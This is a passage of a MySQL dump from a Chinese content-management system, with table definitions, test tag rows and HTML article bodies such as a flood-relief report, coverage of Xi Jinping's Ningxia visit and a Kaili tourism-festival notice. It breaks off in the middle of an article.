INSERT INTO `jc_content_record` VALUES ('35', '36', '1', '2017-01-15 00:09:27', '4');
INSERT INTO `jc_content_record` VALUES ('36', '33', '1', '2017-01-15 00:09:27', '4');
INSERT INTO `jc_content_record` VALUES ('37', '32', '1', '2017-01-15 00:09:27', '4');
INSERT INTO `jc_content_record` VALUES ('38', '30', '1', '2017-01-15 00:09:27', '4');
INSERT INTO `jc_content_record` VALUES ('39', '29', '1', '2017-01-15 00:09:27', '4');
INSERT INTO `jc_content_record` VALUES ('40', '28', '1', '2017-01-15 00:09:27', '4');
INSERT INTO `jc_content_record` VALUES ('41', '27', '1', '2017-01-15 00:09:27', '4');
INSERT INTO `jc_content_record` VALUES ('42', '23', '1', '2017-01-15 00:09:27', '4');
INSERT INTO `jc_content_record` VALUES ('43', '14', '1', '2017-01-15 00:09:28', '4');
INSERT INTO `jc_content_record` VALUES ('44', '12', '1', '2017-01-15 00:09:28', '4');
INSERT INTO `jc_content_record` VALUES ('45', '11', '1', '2017-01-15 00:09:28', '4');
INSERT INTO `jc_content_record` VALUES ('46', '142', '1', '2017-01-15 23:13:59', '0');
INSERT INTO `jc_content_record` VALUES ('47', '142', '1', '2017-01-15 23:35:39', '1');
INSERT INTO `jc_content_record` VALUES ('48', '143', '1', '2017-01-15 23:38:31', '0');
INSERT INTO `jc_content_record` VALUES ('49', '144', '1', '2017-01-15 23:41:09', '0');
INSERT INTO `jc_content_record` VALUES ('50', '145', '1', '2017-01-15 23:41:39', '0');
INSERT INTO `jc_content_record` VALUES ('51', '146', '1', '2017-01-15 23:42:15', '0');
INSERT INTO `jc_content_record` VALUES ('52', '147', '1', '2017-01-15 23:42:42', '0');
INSERT INTO `jc_content_record` VALUES ('53', '148', '1', '2017-01-15 23:43:10', '0');
INSERT INTO `jc_content_record` VALUES ('54', '149', '1', '2017-01-15 23:43:51', '0');
INSERT INTO `jc_content_record` VALUES ('55', '130', '1', '2017-01-16 00:14:30', '1');
INSERT INTO `jc_content_record` VALUES ('56', '132', '1', '2017-01-16 00:14:54', '1');
INSERT INTO `jc_content_record` VALUES ('57', '131', '1', '2017-01-16 00:15:17', '1');
INSERT INTO `jc_content_record` VALUES ('58', '30', '1', '2017-01-16 00:15:46', '1');
INSERT INTO `jc_content_record` VALUES ('59', '11', '1', '2017-01-16 00:16:21', '1');
INSERT INTO `jc_content_record` VALUES ('60', '12', '1', '2017-01-16 00:16:44', '1');
INSERT INTO `jc_content_record` VALUES ('61', '150', '1', '2017-01-16 00:23:57', '0');
INSERT INTO `jc_content_record` VALUES ('62', '151', '1', '2017-01-16 00:24:48', '0');
INSERT INTO `jc_content_record` VALUES ('63', '152', '1', '2017-01-16 00:25:18', '0');
INSERT INTO `jc_content_record` VALUES ('64', '153', '1', '2017-01-16 00:25:39', '0');
INSERT INTO `jc_content_record` VALUES ('65', '154', '1', '2017-01-16 00:26:09', '0');
INSERT INTO `jc_content_record` VALUES ('66', '155', '1', '2017-01-16 00:26:45', '0');
INSERT INTO `jc_content_record` VALUES ('67', '156', '1', '2017-01-16 00:27:10', '0');
INSERT INTO `jc_content_record` VALUES ('68', '157', '1', '2017-01-16 00:27:48', '0');
INSERT INTO `jc_content_record` VALUES ('69', '158', '1', '2017-01-16 00:28:46', '0');
INSERT INTO `jc_content_record` VALUES ('70', '159', '1', '2017-01-16 00:29:11', '0');
INSERT INTO `jc_content_record` VALUES ('71', '160', '1', '2017-01-16 00:29:38', '0');
INSERT INTO `jc_content_record` VALUES ('72', '161', '1', '2017-01-16 00:30:14', '0');
INSERT INTO `jc_content_record` VALUES ('73', '162', '1', '2017-01-16 00:30:39', '0');
INSERT INTO `jc_content_record` VALUES ('74', '163', '1', '2017-01-16 00:31:10', '0');
INSERT INTO `jc_content_record` VALUES ('75', '164', '1', '2017-01-16 00:31:44', '0');
INSERT INTO `jc_content_record` VALUES ('76', '165', '1', '2017-01-16 00:32:09', '0');
INSERT INTO `jc_content_record` VALUES ('77', '166', '1', '2017-01-16 00:32:37', '0');
INSERT INTO `jc_content_record` VALUES ('78', '167', '1', '2017-01-16 00:33:11', '0');
INSERT INTO `jc_content_record` VALUES ('79', '168', '1', '2017-01-16 00:33:39', '0');
INSERT INTO `jc_content_record` VALUES ('80', '169', '1', '2017-01-16 00:34:14', '0');
INSERT INTO `jc_content_record` VALUES ('81', '157', '1', '2017-01-16 00:37:12', '1');
INSERT INTO `jc_content_record` VALUES ('82', '153', '1', '2017-01-16 00:37:35', '1');
INSERT INTO `jc_content_record` VALUES ('83', '130', '1', '2017-01-17 22:35:13', '1');
INSERT INTO `jc_content_record` VALUES ('84', '125', '1', '2017-01-18 18:44:17', '6');
INSERT INTO `jc_content_record` VALUES ('85', '59', '1', '2017-01-18 18:44:17', '6');
INSERT INTO `jc_content_record` VALUES ('86', '130', '1', '2017-02-01 21:25:12', '1');
INSERT INTO `jc_content_record` VALUES ('87', '130', '1', '2017-02-01 21:27:28', '1');

-- ----------------------------
-- Table structure for jc_content_reward_fix
-- ----------------------------
DROP TABLE IF EXISTS `jc_content_reward_fix`;
CREATE TABLE `jc_content_reward_fix` (
  `content_id` int(11) NOT NULL DEFAULT '0',
  `priority` int(11) NOT NULL DEFAULT '10',
  `reward_fix` double NOT NULL DEFAULT '0' COMMENT '固定值',
  UNIQUE KEY `jc_content_reward_fix` (`content_id`,`priority`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='内容打赏设置固定值';

-- ----------------------------
-- Records of jc_content_reward_fix
-- ----------------------------

-- ----------------------------
-- Table structure for jc_content_share_check
-- ----------------------------
DROP TABLE IF EXISTS `jc_content_share_check`;
CREATE TABLE `jc_content_share_check` (
  `share_check_id` int(11) NOT NULL AUTO_INCREMENT,
  `content_id` int(11) NOT NULL COMMENT '共享内容',
  `channel_id` int(11) NOT NULL COMMENT '共享栏目',
  `check_status` tinyint(4) NOT NULL DEFAULT '0' COMMENT '审核状态 0待审核 1审核通过 2推送',
  `check_opinion` varchar(255) DEFAULT NULL COMMENT '审核意见',
  `share_valid` tinyint(1) NOT NULL DEFAULT '0' COMMENT '共享有效性',
  PRIMARY KEY (`share_check_id`),
  KEY `fk_channel_jc_content_share` (`channel_id`),
  KEY `fk_check_jc_content_share` (`content_id`),
  CONSTRAINT `fk_channel_jc_content_share` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`),
  CONSTRAINT `fk_check_jc_content_share` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS共享内容审核信息表';

-- ----------------------------
-- Records of jc_content_share_check
-- ----------------------------

-- ----------------------------
-- Table structure for jc_content_tag
-- ----------------------------
DROP TABLE IF EXISTS `jc_content_tag`;
CREATE TABLE `jc_content_tag` (
  `tag_id` int(11) NOT NULL AUTO_INCREMENT,
  `tag_name` varchar(50) NOT NULL COMMENT 'tag名称',
  `ref_counter` int(11) NOT NULL DEFAULT '1' COMMENT '被引用的次数',
  PRIMARY KEY (`tag_id`),
  UNIQUE KEY `ak_tag_name` (`tag_name`)
) ENGINE=InnoDB AUTO_INCREMENT=95 DEFAULT CHARSET=utf8 COMMENT='CMS内容TAG表';

-- ----------------------------
-- Records of jc_content_tag
-- ----------------------------
INSERT INTO `jc_content_tag` VALUES ('1', '四川', '2');
INSERT INTO `jc_content_tag` VALUES ('2', '政府', '2');
INSERT INTO `jc_content_tag` VALUES ('3', '采购', '2');
INSERT INTO `jc_content_tag` VALUES ('4', '近三年', '1');
INSERT INTO `jc_content_tag` VALUES ('5', '改革', '1');
INSERT INTO `jc_content_tag` VALUES ('6', '成效', '1');
INSERT INTO `jc_content_tag` VALUES ('7', '明显', '1');
INSERT INTO `jc_content_tag` VALUES ('8', '透明度', '1');
INSERT INTO `jc_content_tag` VALUES ('9', '最优', '1');
INSERT INTO `jc_content_tag` VALUES ('10', '入', '1');
INSERT INTO `jc_content_tag` VALUES ('11', '常', '2');
INSERT INTO `jc_content_tag` VALUES ('12', '8', '1');
INSERT INTO `jc_content_tag` VALUES ('13', '个月', '1');
INSERT INTO `jc_content_tag` VALUES ('14', '退', '1');
INSERT INTO `jc_content_tag` VALUES ('15', '南昌', '1');
INSERT INTO `jc_content_tag` VALUES ('16', '总经理', '1');
INSERT INTO `jc_content_tag` VALUES ('17', '有', '1');
INSERT INTO `jc_content_tag` VALUES ('18', '新消息', '1');
INSERT INTO `jc_content_tag` VALUES ('19', '一声', '2');
INSERT INTO `jc_content_tag` VALUES ('20', '案', '1');
INSERT INTO `jc_content_tag` VALUES ('21', '说法', '1');
INSERT INTO `jc_content_tag` VALUES ('22', '盛大', '1');
INSERT INTO `jc_content_tag` VALUES ('23', '发售', '1');
INSERT INTO `jc_content_tag` VALUES ('24', '按时', '1');
INSERT INTO `jc_content_tag` VALUES ('25', '发达', '1');
INSERT INTO `jc_content_tag` VALUES ('26', '身份', '1');
INSERT INTO `jc_content_tag` VALUES ('27', '证照', '1');
INSERT INTO `jc_content_tag` VALUES ('28', 'v', '2');
INSERT INTO `jc_content_tag` VALUES ('29', '型', '1');
INSERT INTO `jc_content_tag` VALUES ('30', '撒娇', '1');
INSERT INTO `jc_content_tag` VALUES ('31', '发', '9');
INSERT INTO `jc_content_tag` VALUES ('32', '阿', '4');
INSERT INTO `jc_content_tag` VALUES ('33', '萨', '4');
INSERT INTO `jc_content_tag` VALUES ('34', '德', '1');
INSERT INTO `jc_content_tag` VALUES ('35', '飞洒', '1');
INSERT INTO `jc_content_tag` VALUES ('36', '武器', '1');
INSERT INTO `jc_content_tag` VALUES ('37', '二千万', '1');
INSERT INTO `jc_content_tag` VALUES ('38', '人气', '1');
INSERT INTO `jc_content_tag` VALUES ('39', 'qwerqwrasfdasfasfa', '1');
INSERT INTO `jc_content_tag` VALUES ('40', '玩', '1');
INSERT INTO `jc_content_tag` VALUES ('41', '玩儿', '2');
INSERT INTO `jc_content_tag` VALUES ('42', '去', '2');
INSERT INTO `jc_content_tag` VALUES ('43', '文如其人', '1');
INSERT INTO `jc_content_tag` VALUES ('44', '姐姐', '3');
INSERT INTO `jc_content_tag` VALUES ('45', 'ggggggggggggggg', '1');
INSERT INTO `jc_content_tag` VALUES ('46', '发生', '8');
INSERT INTO `jc_content_tag` VALUES ('47', '大发', '1');
INSERT INTO `jc_content_tag` VALUES ('48', '啊啊', '7');
INSERT INTO `jc_content_tag` VALUES ('49', '啊啊啊', '16');
INSERT INTO `jc_content_tag` VALUES ('50', 'up', '1');
INSERT INTO `jc_content_tag` VALUES ('51', '噢', '1');
INSERT INTO `jc_content_tag` VALUES ('52', '速度', '1');
INSERT INTO `jc_content_tag` VALUES ('53', '普', '1');
INSERT INTO `jc_content_tag` VALUES ('54', '爱', '1');
INSERT INTO `jc_content_tag` VALUES ('55', '刷屏', '1');
INSERT INTO `jc_content_tag` VALUES ('56', '顺', '5');
INSERT INTO `jc_content_tag` VALUES ('57', '丰', '5');
INSERT INTO `jc_content_tag` VALUES ('58', '阿斯顿', '4');
INSERT INTO `jc_content_tag` VALUES ('59', '沙发', '4');
INSERT INTO `jc_content_tag` VALUES ('60', '舒服', '3');
INSERT INTO `jc_content_tag` VALUES ('61', '撒', '4');
INSERT INTO `jc_content_tag` VALUES ('62', '啊', '1');
INSERT INTO `jc_content_tag` VALUES ('63', '是的', '2');
INSERT INTO `jc_content_tag` VALUES ('64', '顶顶', '2');
INSERT INTO `jc_content_tag` VALUES ('65', '顶顶顶', '7');
INSERT INTO `jc_content_tag` VALUES ('66', '大事', '1');
INSERT INTO `jc_content_tag` VALUES ('67', '呵呵', '16');
INSERT INTO `jc_content_tag` VALUES ('68', '呵', '1');
INSERT INTO `jc_content_tag` VALUES ('69', '快快', '20');
INSERT INTO `jc_content_tag` VALUES ('70', '快', '2');
INSERT INTO `jc_content_tag` VALUES ('71', '卡', '1');
INSERT INTO `jc_content_tag` VALUES ('72', '死了', '1');
INSERT INTO `jc_content_tag` VALUES ('73', '发送', '1');
INSERT INTO `jc_content_tag` VALUES ('74', '大法师', '1');
INSERT INTO `jc_content_tag` VALUES ('75', '打发', '1');
INSERT INTO `jc_content_tag` VALUES ('76', '德法', '1');
INSERT INTO `jc_content_tag` VALUES ('77', '师', '1');
INSERT INTO `jc_content_tag` VALUES ('78', '法师', '1');
INSERT INTO `jc_content_tag` VALUES ('79', '法', '3');
INSERT INTO `jc_content_tag` VALUES ('80', '师法', '1');
INSERT INTO `jc_content_tag` VALUES ('81', '啦', '24');
INSERT INTO `jc_content_tag` VALUES ('82', '斯蒂芬', '1');
INSERT INTO `jc_content_tag` VALUES ('83', '嘻嘻', '7');
INSERT INTO `jc_content_tag` VALUES ('84', '嘻', '1');
INSERT INTO `jc_content_tag` VALUES ('85', '谢谢', '1');
INSERT INTO `jc_content_tag` VALUES ('86', '放大', '1');
INSERT INTO `jc_content_tag` VALUES ('87', '师傅', '1');
INSERT INTO `jc_content_tag` VALUES ('88', 'vczxcvzxv', '1');
INSERT INTO `jc_content_tag` VALUES ('89', '事实上', '3');
INSERT INTO `jc_content_tag` VALUES ('90', '试试', '1');
INSERT INTO `jc_content_tag` VALUES ('91', '暗示', '1');
INSERT INTO `jc_content_tag` VALUES ('92', '芬', '2');
INSERT INTO `jc_content_tag` VALUES ('93', '安抚', '1');
INSERT INTO `jc_content_tag` VALUES ('94', '1', '1');

-- ----------------------------
-- Table structure for jc_content_topic
-- ----------------------------
DROP TABLE IF EXISTS `jc_content_topic`;
CREATE TABLE `jc_content_topic` (
  `content_id` int(11) NOT NULL,
  `topic_id` int(11) NOT NULL,
  PRIMARY KEY (`content_id`,`topic_id`),
  KEY `fk_jc_content_topic` (`topic_id`),
  CONSTRAINT `fk_jc_content_topic` FOREIGN KEY (`topic_id`) REFERENCES `jc_topic` (`topic_id`),
  CONSTRAINT `fk_jc_topic_content` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS专题内容关联表';

-- ----------------------------
-- Records of jc_content_topic
-- ----------------------------
INSERT INTO `jc_content_topic` VALUES ('2', '1');
INSERT INTO `jc_content_topic` VALUES ('7', '1');
INSERT INTO `jc_content_topic` VALUES ('11', '1');
INSERT INTO `jc_content_topic` VALUES ('12', '1');
INSERT INTO `jc_content_topic` VALUES ('13', '1');
INSERT INTO `jc_content_topic` VALUES ('14', '1');
INSERT INTO `jc_content_topic` VALUES ('27', '1');
INSERT INTO `jc_content_topic` VALUES ('28', '1');
INSERT INTO `jc_content_topic` VALUES ('32', '1');
INSERT INTO `jc_content_topic` VALUES ('112', '1');
INSERT INTO `jc_content_topic` VALUES ('113', '1');
INSERT INTO `jc_content_topic` VALUES ('114', '1');
INSERT INTO `jc_content_topic` VALUES ('115', '1');
INSERT INTO `jc_content_topic` VALUES ('116', '1');
INSERT INTO `jc_content_topic` VALUES ('117', '1');
INSERT INTO `jc_content_topic` VALUES ('118', '1');
INSERT INTO `jc_content_topic` VALUES ('119', '1');
INSERT INTO `jc_content_topic` VALUES ('120', '1');
INSERT INTO `jc_content_topic` VALUES ('130', '1');
INSERT INTO `jc_content_topic` VALUES ('131', '1');
INSERT INTO `jc_content_topic` VALUES ('132', '1');
INSERT INTO `jc_content_topic` VALUES ('141', '1');
INSERT INTO `jc_content_topic` VALUES ('2', '2');
INSERT INTO `jc_content_topic` VALUES ('7', '2');
INSERT INTO `jc_content_topic` VALUES ('13', '2');
INSERT INTO `jc_content_topic` VALUES ('14', '2');
INSERT INTO `jc_content_topic` VALUES ('23', '2');
INSERT INTO `jc_content_topic` VALUES ('27', '2');
INSERT INTO `jc_content_topic` VALUES ('28', '2');
INSERT INTO `jc_content_topic` VALUES ('29', '2');
INSERT INTO `jc_content_topic` VALUES ('32', '2');
INSERT INTO `jc_content_topic` VALUES ('112', '2');
INSERT INTO `jc_content_topic` VALUES ('113', '2');
INSERT INTO `jc_content_topic` VALUES ('114', '2');
INSERT INTO `jc_content_topic` VALUES ('115', '2');
INSERT INTO `jc_content_topic` VALUES ('116', '2');
INSERT INTO `jc_content_topic` VALUES ('117', '2');
INSERT INTO `jc_content_topic` VALUES ('118', '2');
INSERT INTO `jc_content_topic` VALUES ('119', '2');
INSERT INTO `jc_content_topic` VALUES ('120', '2');
INSERT INTO `jc_content_topic` VALUES ('2', '3');
INSERT INTO `jc_content_topic` VALUES ('7', '3');
INSERT INTO `jc_content_topic` VALUES ('13', '3');
INSERT INTO `jc_content_topic` VALUES ('14', '3');
INSERT INTO `jc_content_topic` VALUES ('23', '3');
INSERT INTO `jc_content_topic` VALUES ('27', '3');
INSERT INTO `jc_content_topic` VALUES ('28', '3');
INSERT INTO `jc_content_topic` VALUES ('32', '3');
INSERT INTO `jc_content_topic` VALUES ('112', '3');
INSERT INTO `jc_content_topic` VALUES ('113', '3');
INSERT INTO `jc_content_topic` VALUES ('114', '3');
INSERT INTO `jc_content_topic` VALUES ('115', '3');
INSERT INTO `jc_content_topic` VALUES ('116', '3');
INSERT INTO `jc_content_topic` VALUES ('117', '3');
INSERT INTO `jc_content_topic` VALUES ('118', '3');
INSERT INTO `jc_content_topic` VALUES ('119', '3');
INSERT INTO `jc_content_topic` VALUES ('120', '3');
INSERT INTO `jc_content_topic` VALUES ('37', '4');
INSERT INTO `jc_content_topic` VALUES ('111', '4');
INSERT INTO `jc_content_topic` VALUES ('142', '4');
INSERT INTO `jc_content_topic` VALUES ('143', '4');

-- ----------------------------
-- Table structure for jc_content_txt
-- ----------------------------
DROP TABLE IF EXISTS `jc_content_txt`;
CREATE TABLE `jc_content_txt` (
  `content_id` int(11) NOT NULL,
  `txt` longtext COMMENT '文章内容',
  `txt1` longtext COMMENT '扩展内容1',
  `txt2` longtext COMMENT '扩展内容2',
  `txt3` longtext COMMENT '扩展内容3',
  PRIMARY KEY (`content_id`),
  CONSTRAINT `fk_jc_txt_content` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS内容文本表';

-- ----------------------------
-- Records of jc_content_txt
-- ----------------------------
INSERT INTO `jc_content_txt` VALUES ('11', '<p style=\"text-indent: 2em;\">记者从国家防总、水利部14日召开的新闻发布会上获悉：据初步统计，截至7月13日，长江中下游湖北、湖南、江西、安徽、江苏等5省堤防巡查防守和抢险共投入62.2万人(含部队3.08万人)，6月30日以来已累计投入抗洪抢险777万人次。</p><p><br/></p><p style=\"text-indent: 2em;\">截至7月13日，今年以来全国已有28省(区、市)1508县遭受洪灾，农作物受灾面积5460.66千公顷，受灾人口6074.67万人，因灾死亡237人、失踪93人，倒塌房屋14.72万间，直接经济损失约1469.80亿元。与2000年以来同期均值相比，今年受灾人口、死亡人口、倒塌房屋分别偏少6%、49%、55%，受灾面积、直接经济损失分别偏多26%、213%。</p><p><br/></p><p style=\"text-indent: 2em;\">此外，中央气象台14日继续发布暴雨蓝色预警，未来3天，强降雨将自西向东影响四川盆地、江汉、江淮、江南北部及黄淮南部，上述地区将有大到暴雨，部分地区有大暴雨，局部伴有短时雷雨大风等强对流天气。</p>', null, null, null);
INSERT INTO `jc_content_txt` VALUES ('12', '<p style=\"text-indent: 2em;\">央视新闻：【习近平就#法国尼斯袭击事件#向法国总统致慰问电】习近平对这一骇人听闻的野蛮行径表示强烈谴责，向不幸遇难者表示深切的哀悼，向伤者和遇难者家属表示诚挚的慰问。习近平指出，中方坚决反对一切形式的恐怖主义，愿同法方深化反恐合作，共同维护中法两国和世界安全和平。</p>', null, null, null);
INSERT INTO `jc_content_txt` VALUES ('14', '<p style=\"text-indent: 2em;\">【习近平考察宁夏首站到固原，冒雨向红军长征会师纪念碑敬献花篮】7月18日，习近平总书记到宁夏回族自治区考察。从北京直飞固原，驱车70多公里到将台堡，向红军长征会师纪念碑敬献花篮并参观三军会师纪念馆。1936年10月，红军三大主力在会宁和将台堡会师，标志二万五千里长征胜利结束。</p><p><br/></p><p style=\"text-align: center\"><img src=\"/u/cms/www/201607/19142227i3ee.jpg\" title=\"16464387039280572236.jpg\"/></p><p><br/></p><p style=\"text-align: center;\">新华社记者鞠鹏、李涛摄</p><p><br/></p><p style=\"text-align: center\"><img src=\"/u/cms/www/201607/1914230968h5.jpg\" title=\"9093755211529617012.jpg\"/></p><p><br/></p><p style=\"text-indent: 2em;\">【习近平：缅怀先烈、不忘初心，走好新的长征路】参观三军会师纪念馆时，习近平说，红军长征创造了中外历史的奇迹。革命理想高于天，不怕牺牲、排除万难去争取胜利，面对形形色色的敌人决一死战、克敌制胜，这些都是长征精神的内涵。我们要继承和弘扬好伟大的长征精神。有了这样的精神，没有什么克服不了的困难。我们完全有信心有决心有恒心实现中华民族伟大复兴的中国梦。</p><p><br/></p><p style=\"text-indent: 2em;\">习近平说，长征永远在路上。这次专程来这里，就是缅怀先烈、不忘初心，走新的长征路。今天是实现“两个一百年”奋斗目标的新长征。我们这一代人要走好我们这一代人的长征路。</p><p><br/></p><p style=\"text-align: center\"><img src=\"/u/cms/www/201607/19142342h33w.jpg\" title=\"13099311371353179840.jpg\"/></p><p><br/></p><p style=\"text-align: center;\">新华社记者鞠鹏、李涛摄</p><p><br/></p><p style=\"text-indent: 2em;\">【习近平：革命传统教育基地不要贪大求洋】习近平说，革命传统和爱国主义教育基地建设一定不要追求高大全，搞得很洋气、很现代化，花很多钱，那就不是革命传统了，革命传统就变味了。可以通过传统教育带动旅游业，但不能失去红色旅游的底色。只有体会到革命年代的艰苦，才能使人们真正受到教育。</p><p><br/></p><p style=\"text-align: center\"><img src=\"/u/cms/www/201607/19142414bvfg.jpg\" title=\"7973019827669232390.jpg\"/></p><p><br/></p><p style=\"text-align: center;\">新华社记者鞠鹏、李涛摄</p><p><br/></p><p><br/></p><p style=\"text-indent: 2em;\">【习近平：我是来看扶贫落实情况的】18日下午，习近平总书记来到泾源县大湾乡杨岭村看望父老乡亲，实地考察精准扶贫情况。总书记察看村容村貌，向当地干部了解村子脱贫情况。走进回族群众马科的家，习近平察看屋内陈设，掀开褥子看炕垒得好不好，问屋顶上铺没铺油毡、会不会漏雨，电视能看多少台。来到厨房，打开灶上的大锅盖，看里面做着什么好吃的。厨房一角有个淋浴的地方，听说安了太阳能热水器，习近平说“挺好”，关心地问家里的小男孩：“你常洗澡吗？”</p><p><br/></p><p style=\"text-indent: 2em;\">墙上张贴着的“建档立卡贫困户精准脱贫信息卡”引起总书记注意。“6口人、劳动力2人，养牛6头，种玉米15亩，牛出栏2头收入7000，劳务输出收入21500，综合收入47000……”习近平逐项察看，一笔一笔算着马科家的收入账。习近平说，信息登记挺细致，关键要抓好落实，我就是来看落实情况的。马科说，我一定努力让今年计划落到口袋里，实现脱贫摘帽的目标。习近平希望马科把孩子教育搞好，学知识、有文化，决不能让他们输在起跑线上。</p><p><br/></p><p style=\"text-align: center\"><img src=\"/u/cms/www/201607/19142446ch8y.jpg\" title=\"2231079109511926610.jpg\"/></p><p><br/></p><p style=\"text-align: center;\">新华社记者鞠鹏、李涛摄</p><p><br/></p><p style=\"text-indent: 2em;\">【习近平：固原的发展脱胎换骨，增强了我们打赢脱贫攻坚战的信心】习近平坐在杨岭村村民马克俊家的炕上，同村干部、党员代表、养牛大户和贫困户代表拉起家常。总书记说，我听你们说说心里话，咱们唠一唠。大家向总书记汇报近几年脱贫攻坚的情况，说党的政策确实确实太好太好了。习近平拉着马克俊的手说，你年纪比我小，是我老弟。看着你和乡亲们的生活越来越好我很高兴。西海固曾经“苦瘠甲天下”。这是我第3次到固原来。我提出再到比较艰苦的农村看一看。通过走访，了解到村里已经解决了饮水问题，住房等生活条件有了明显改善，还开始找到了产业脱贫的路子。全国还有5000万贫困人口，到2020年一定要实现全部脱贫目标。这是我当前最关心的事情。</p><p><br/></p><p style=\"text-align: center\"><img src=\"/u/cms/www/201607/19142513not2.jpg\" title=\"4804757052710294014.jpg\"/></p><p><br/></p><p style=\"text-align: center;\">新华社记者鞠鹏、李涛摄</p><p><br/></p><p style=\"text-indent: 2em;\">【习近平：农村脱贫奔小康，支部很重要】习近平称赞大湾乡杨岭村党支部第一书记兰竹林对村里的情况门儿清，说明工作比较扎实。他说，一个村子建设得好，关键要有一个好党支部。村党支部带领村民脱贫奔小康，只要有规划，有措施，真抓实干，群众拥护，就一定能把工作做好。希望你们把基层党组织和基层政权建设好，团结带领广大群众奔小康。我们还要更上一层楼!</p><p><br/></p><p style=\"text-indent: 2em;\">【总书记为村民算养牛收支账】宁夏固原市大湾乡杨岭村，习近平走进贫困户马克俊家，首先来到小院一角的牛棚。养牛是杨岭村产业脱贫的重要途径，村里的贫困户在政府帮扶下，每家饲养2头安格斯基础母牛、3头育肥牛。习近平询问肉牛出栏育肥、贷款等情况。“过去都是养大黄牛，如今养上了进口牛”，马克俊给总书记详细算起了现在的养牛收支明细账。养牛大户马全龙也来到了小院里，他告诉总书记，自家过去养了5头牛，如今有了10多头，还准备增加到20头。习近平勉励他说：“要发挥好示范带头作用，把好的经验传授给村民。”</p><p><br/></p><p style=\"text-indent: 2em;\">【习近平：防范市场风险，政府要做好信息服务】细雨绵绵，沃野千里。宁夏原州区彭堡镇姚磨村，习近平冒雨视察万亩冷凉蔬菜基地。蔬菜展台前，新鲜采摘的西兰花、紫甘蓝、辣椒、马铃薯等，整齐“列队”。边走边看，习近平问得仔细。“检测标准怎么样？”“一亩地收入多少？”“农活有技术员指导吗？”“喷灌设施一亩地成本多少？”村里的党员干部、种植大户簇拥在总书记身边。习近平和他们聊起土地承包费、务农打工费、入股分红等，询问他们生产中遇到的困难。一位农民说，感觉市场还不大稳定，想更好了解市场需求。习近平表示，防范市场风险，既需要经营个体敏锐把握，也需要政府加强服务，尤其要做好信息服务工作。</p><p><br/></p><p style=\"text-align: center\"><img src=\"/u/cms/www/201607/19142548un62.jpg\" title=\"2176556949782138032.jpg\"/></p><p><br/></p><p style=\"text-align: center;\">新华社记者鞠鹏、李涛摄</p><p><br/></p><p style=\"text-align: center\"><img src=\"/u/cms/www/201607/19142605p9xl.jpg\" title=\"17322238994688503995.jpg\"/></p><p><br/></p><p style=\"text-align: center;\">新华社记者鞠鹏、李涛摄</p><p><br/></p><p><br/></p>', null, null, null);
INSERT INTO `jc_content_txt` VALUES ('23', '<p>　　为了贯彻落实贵州省委、省政府关于构建全域旅游、推动旅游“井喷式”增长和黔东南州委、州政府“用好生态文化两个宝贝，打造国内外知名的民族文化旅游目的地”的战略部署，凯里市委、市政府突出建设国际旅游城市、国家园林城市、国家创新型城市的功能定位，以“节庆搭台，旅游唱戏”的超常规举措，着力推动凯里旅游从初级阶段快速向中高级阶段演化。2016年“十一”黄金周推出了文化旅游系列活动。</p><p>　　1、一赛一节</p><p>　　“一赛”即“牛霸天下”2016首届中国•凯里斗牛国际标准赛，“一节”即2016中国•凯里牛崇拜文化艺术节。</p><p>　　活动共分为四个场地：(1)斗牛国际标准赛场：凯里市民族文化活动中心(民族体育场)。(2)牛崇拜文化艺术节第一会场：凯里市民族文化活动中心(民族体育场)场外。(3)牛崇拜文化艺术节第二会场：凯里苗侗风情园。(4)牛崇拜文化艺术节第三会场：凯里民族文化园。举办时间：“牛霸天下”2016首届中国•凯里斗牛国际标准赛10月1日至10月6日，每日下午一点开始。2016中国•凯里牛崇拜文化艺术节10月1日至3日，每天白天和晚上在三个会场均有不同活动。</p><p>　　2、“弘扬民族文化，共筑中国梦”苗族刺绣体验</p><p>　　活动时间：10月1日至10月9日。地点：苗妹非遗博物馆。活动内容：游客现场体验、设计、制作自己心仪的作品。</p><p>　　3、2016“国庆节”南花村约你做客</p><p>　　活动时间：10月1日至10月7日。地点：南花苗寨。活动内容：观原生态山水风光、赏苗族歌舞、学苗族刺绣、饮百年神泉、品苗家米酒、体验传统打糍粑。</p><p>　　4、“李宁红双喜杯”2016中国乒乓球协会会员联赛</p><p>　　活动时间：10月1日至10月7日。地点：凯里学院体育馆。来自全国各地600多名中国乒乓球协会会员参赛，世界乒乓球冠军马琳、国家乒乓球队金牌教练吴敬平亲临凯里为比赛开赛。</p><p>　　5、云谷田园观光康体系列活动</p><p>　　活动时间：10月1日至10月7日。地点：舟溪云谷田园生态农业观光园。活动内容：农业观光采摘和钓鱼比赛等趣味体验活动。</p><p>　　2016“十一”黄金周凯里地区文化旅游系列活动内容丰富，时间长、规模大，亮点多、参与性强，欢迎中外游客和广大市民积极参与体验。</p><p><br/></p>', null, null, null);
INSERT INTO `jc_content_txt` VALUES ('27', '<p style=\"text-indent: 2em; text-align: center;\"><img src=\"/u/cms/www/201609/23140225zalw.jpg\" title=\"641-(1).jpg\" alt=\"641-(1).jpg\"/></p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">【学习进行时】在不久前举行的推进“一带一路”建设工作座谈会上，习近平要求：“以钉钉子精神抓下去，一步一步把‘一带一路’建设推向前进，让‘一带一路’建设造福沿线各国人民。”</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">习近平为何如此看重“一带一路”建设？自他发出沿线国家和地区共建“一带一路”倡议三年来，都取得了哪些进展？</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">6月22日，国家主席习近平在塔什干乌兹别克斯坦最高会议立法院发表题为《携手共创丝绸之路新辉煌》的重要演讲。 新华社记者马占成摄</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">2013年9月7日，习近平在出访中亚国家期间，首次提出共建“丝绸之路经济带”。同年10月，他又提出共同建设21世纪“海上丝绸之路”，二者共同构成了“一带一路”重大倡议。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">而今，三年了。</p><p style=\"text-indent: 2em;\"><br/></p><p 